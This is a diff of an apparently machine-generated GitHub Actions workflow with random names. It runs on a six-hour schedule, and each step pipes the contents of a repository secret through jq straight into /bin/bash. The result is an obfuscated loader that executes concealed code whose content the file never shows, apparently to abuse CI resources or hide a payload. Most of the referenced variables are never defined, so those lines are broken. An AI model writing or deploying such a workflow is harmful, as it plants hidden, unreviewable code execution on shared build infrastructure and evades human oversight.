@@ -1,27 +1,24 @@
 name: evaporatepanicky
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 5/6 * * *'
-jobs:  # 26891
+    - cron: '32 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: evaporatepanicky
         env:
-          mzvny75: ${{ secrets.mzvny75 }}
+          lcvdr0593: ${{ secrets.lcvdr0593 }}
         run: |
-          echo $mzvny75 | jq -r .z3 | /bin/bash
-          echo $ielec44 | jq -r .hpppi99 | /bin/bash
-          echo $jnypk4 | jq -r .sal3809 | /bin/bash
-          echo $in9933 | jq -r .ipfur787 | /bin/bash
-          echo $ne439 | jq -r .ldwlk025 | /bin/bash
-          echo $rew19 | jq -r .xgghn27300 | /bin/bash
-          echo $mat3 | jq -r .uqild89594 | /bin/bash
-          echo $ch72 | jq -r .mjhg9 | /bin/bash
-          echo $yk7 | jq -r .xc7354 | /bin/bash
-          echo $e845 | jq -r .gdgz98 | /bin/bash
-          echo $jbvj8083 | jq -r .leuq0059 | /bin/bash
-          echo $f98587 | jq -r .e6413 | /bin/bash
+          echo $lcvdr0593 | jq -r .w08 | /bin/bash
+          echo $aq8394 | jq -r .aup87073 | /bin/bash
+          echo $c934 | jq -r .vnuu18 | /bin/bash
+          echo $hjcb1408 | jq -r .atoig364 | /bin/bash
+          echo $j031 | jq -r .j2418 | /bin/bash
+          echo $ytdhm720 | jq -r .xqw629 | /bin/bash
 
